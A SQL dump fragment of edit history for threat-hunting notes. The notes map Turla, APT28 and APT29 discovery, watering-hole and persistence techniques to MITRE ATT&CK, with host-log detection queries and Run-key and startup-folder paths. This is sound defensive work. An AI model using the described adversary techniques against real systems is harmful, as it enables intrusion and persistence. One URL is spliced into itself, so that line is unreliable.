https://confluence.di2e.net/display/CYH836/Turla%3A+T1566.002+-+Spearphishing+Link?src=contextnavpagetreemode\r\n</pre>\r\n\r\n'),(308,334,'attr','description','Turla has used net user to enumerate local accounts on the system.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net user\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1087/001/\r\n</pre>','Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net user\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1087/001/\r\n</pre>'),(309,335,'attr','description','Turla has infected victims using watering holes.\r\n\r\n<pre>\r\nHunter Notes: \r\nTurla has infected victims using watering holes.\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1189/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1189+-+Drive-by+Compromise\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1189+-+Drive-by+Compromise?src=contextnavpagetreemode\r\n</pre>','Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user\'s web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\r\n\r\nMultiple ways of delivering exploit code to a browser exist, including:\r\n\r\n    A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\r\n    Malicious ads are paid for and served through legitimate ad providers.\r\n    Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\r\n\r\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.[1]\r\n\r\nTypical drive-by compromise process:\r\n\r\n    A user visits a website that is used to host the adversary controlled content.\r\n    Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.\r\n        The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\r\n    Upon finding a vulnerable version, exploit code is delivered to the browser.\r\n    If exploitation is successful, then it will give the adversary code execution on the user\'s system unless other protections are in place.\r\n        In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\r\n\r\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\r\n\r\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.[2]\r\n\r\n<pre>\r\nHunter Notes: \r\ninfected victims using watering holes.\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1189/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1189+-+Drive-by+Compromise\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1189+-+Drive-by+Compromise?src=contextnavpagetreemode\r\n</pre>'),(310,336,'attr','description','Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.[20][51] Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1087 - Account Discovery - CYH\r\nEventID: (1 OR 800 OR 4103 OR 4104 OR 4688) AND ProcessName: <Netstat, etc>\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>','Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.[20][51] Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1087 - Account Discovery - CYH\r\nEventID: (1 OR 800 OR 4103 OR 4104 OR 4688) AND ProcessName: <Netstat, etc>\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"arp -a\" OR \"nbtstat -n\" OR \"net config\" OR \"ipconfig /all\" OR route)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>'),(311,337,'attr','description','Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user\'s web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\r\n\r\nMultiple ways of delivering exploit code to a browser exist, including:\r\n\r\n    A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\r\n    Malicious ads are paid for and served through legitimate ad providers.\r\n    Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\r\n\r\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.[1]\r\n\r\nTypical drive-by compromise process:\r\n\r\n    A user visits a website that is used to host the adversary controlled content.\r\n    Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.\r\n        The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\r\n    Upon finding a vulnerable version, exploit code is delivered to the browser.\r\n    If exploitation is successful, then it will give the adversary code execution on the user\'s system unless other protections are in place.\r\n        In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\r\n\r\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\r\n\r\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.[2]\r\n\r\n<pre>\r\nHunter Notes: \r\ninfected victims using watering holes.\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1189/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1189+-+Drive-by+Compromise\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1189+-+Drive-by+Compromise?src=contextnavpagetreemode\r\n</pre>','Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user\'s web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\r\n\r\nMultiple ways of delivering exploit code to a browser exist, including:\r\n\r\nA legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.\r\nMalicious ads are paid for and served through legitimate ad providers.\r\nBuilt-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\r\n\r\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.[1]\r\n\r\nTypical drive-by compromise process:\r\n\r\nA user visits a website that is used to host the adversary controlled content.\r\nScripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.\r\nThe user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\r\nUpon finding a vulnerable version, exploit code is delivered to the browser.\r\nIf exploitation is successful, then it will give the adversary code execution on the user\'s system unless other protections are in place.\r\nIn some cases a second visit to the website after the initial scan is required before exploit code is delivered.\r\n\r\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\r\n\r\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.[2]\r\n\r\n<pre>\r\nHunter Notes: \r\ninfected victims using watering holes.\r\n</pre>\r\n\r\n<pre>\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1189/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1189+-+Drive-by+Compromise\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1189+-+Drive-by+Compromise?src=contextnavpagetreemode\r\n</pre>'),(312,338,'attr','description','Turla surveys a system upon check-in to discover operating system configuration details using the systeminfo, gpresult, and set commands.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (systeminfo OR gpresult OR set)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1082/\r\n</pre>','An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nTools such as Systeminfo can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS systemsetup command, but it requires administrative privileges.\r\n\r\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.[1][2][3]\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (systeminfo OR gpresult OR set)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1082/\r\n</pre>'),(313,339,'attr','description','Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.[20][51] Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1087 - Account Discovery - CYH\r\nEventID: (1 OR 800 OR 4103 OR 4104 OR 4688) AND ProcessName: <Netstat, etc>\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"arp -a\" OR \"nbtstat -n\" OR \"net config\" OR \"ipconfig /all\" OR route)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>','Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\r\n\r\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary\'s goals. Cloud providers may have different ways in which their virtual networks operate.[1][2][3]\r\n\r\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to \"net session\".\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1087 - Account Discovery - CYH\r\nEventID: (1 OR 800 OR 4103 OR 4104 OR 4688) AND ProcessName: <Netstat, etc>\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"arp -a\" OR \"nbtstat -n\" OR \"net config\" OR \"ipconfig /all\" OR route)\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>'),(314,340,'attr','description','APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : 1 AND CommandLine : *forfiles*\r\n(Playbook) T1083 - File and Directory Discovery\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1083/\r\n</pre>','Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. [1] Custom tools may also be used to gather file and directory information and interact with the Native API.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : 1 AND CommandLine : *forfiles*\r\n(Playbook) T1083 - File and Directory Discovery\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1083/\r\n</pre>'),(315,341,'attr','description','Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. [1] Custom tools may also be used to gather file and directory information and interact with the Native API.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : 1 AND CommandLine : *forfiles*\r\n(Playbook) T1083 - File and Directory Discovery\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1083/\r\n</pre>','Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : 1 AND CommandLine : *forfiles*\r\n(Playbook) T1083 - File and Directory Discovery\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1083/\r\n</pre>'),(316,342,'relation','copied_to',NULL,'168'),(317,343,'relation','copied_from',NULL,'167'),(318,344,'attr','description','An APT28 loader Trojan will enumerate the victim\'s processes searching for explorer.exe if its current process does not have necessary permissions.\r\n\r\nTurla surveys a system upon check-in to discover running processes using the tasklist /v command.[52] Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nAPT28:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded. It was added from the Mitre description that APT 28 was specifically looking for it.\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"tasklist /v\" OR \"tasklist /svc\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>','Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nAPT28:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded. It was added from the Mitre description that APT 28 was specifically looking for it.\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"tasklist /v\" OR \"tasklist /svc\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>'),(319,345,'attr','description','Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nAPT28:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded. It was added from the Mitre description that APT 28 was specifically looking for it.\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"tasklist /v\" OR \"tasklist /svc\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>','Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded. It was added from the Mitre description that APT 28 was specifically looking for it.\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"tasklist /v\" OR \"tasklist /svc\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>'),(320,346,'attr','description','Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : 1 AND CommandLine : *forfiles*\r\n(Playbook) T1083 - File and Directory Discovery\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1083/\r\n</pre>','Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : 1 AND CommandLine : *forfiles*\r\n(Playbook) T1083 - File and Directory Discovery\r\n\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attackhttps://attack.mitre.org/techniques/T1083/.mitre.org/techniques/T1083/\r\n</pre>'),(321,347,'attr','description','Obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND \"Get-ManagementRoleAssignment\"\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\n\r\n</pre>','Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND \"Get-ManagementRoleAssignment\"\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\n\r\n</pre>'),(322,348,'attr','description','Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded. It was added from the Mitre description that APT 28 was specifically looking for it.\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"tasklist /v\" OR \"tasklist /svc\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>','Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\r\n\r\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\n(Playbook) T1057 - Process Discovery\r\nEventID: 1 AND (commandline:\"*tasklist*\" AND processname:\"explorer.exe\") - for CLI execution\r\nEventID: 19 AND commandline:\"*Get-WMIobject*: AND processname:\"explorer.exe\") - for WMI execution\r\nEventID: 4103 OR 4104 AND (commandline:\"*Get-Process*\" OR commandline:\"*ps*\" OR commandline:\"*gps*\" AND processname:\"explorer.exe\") - for Powershell execution\r\nNOTE: processname:\"explorer.exe\" can be excluded.\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"tasklist /v\" OR \"tasklist /svc\")\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1057/\r\nhttps://attack.mitre.org/techniques/T1049/\r\n</pre>'),(323,349,'attr','subject','Boot Or Logon Autostart Execution - T1547.001 / .009','Boot Or Logon Autostart Execution - T1547'),(324,349,'attr','description','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\nAPT28 has deployed malware that has copied itself to the startup directory for persistence.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009:\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n\r\nAPT28:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>','Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.[1][2][3][4][5]  These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\r\n\r\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.\r\n\r\nReference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1547+-+Boot+or+Logon+Autostart+Execution\r\n</pre>'),(325,350,'attr','description','APT 29 used named and hijacked scheduled tasks to establish persistence.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID: (4698-4702)\r\nLeast Frequency Analysis\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1053/005/\r\n</pre>','\r\nAdversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\r\n\r\nThe deprecated at utility could also be abused by adversaries (ex: At (Windows)), though at.exe can not access tasks created with schtasks or the Control Panel.\r\n\r\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\r\n\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nEventID: (4698-4702)\r\nLeast Frequency Analysis\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1053/005/\r\n</pre>'),(326,351,'relation','copied_to',NULL,'169'),(327,352,'relation','copied_from',NULL,'168'),(328,353,'attr','description','APT28 has deployed malware that has copied itself to the startup directory for persistence. C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\r\n\r\nA Turla Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence. Turla established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion]Winlogon.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nAPT28:\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>','dversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. [1] These programs will be executed under the context of the user and will have the account\'s associated permissions level.\r\n\r\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\r\n\r\n<pr>\r\nThe following run keys are created by default on Windows systems:\r\n\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n    HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\r\n    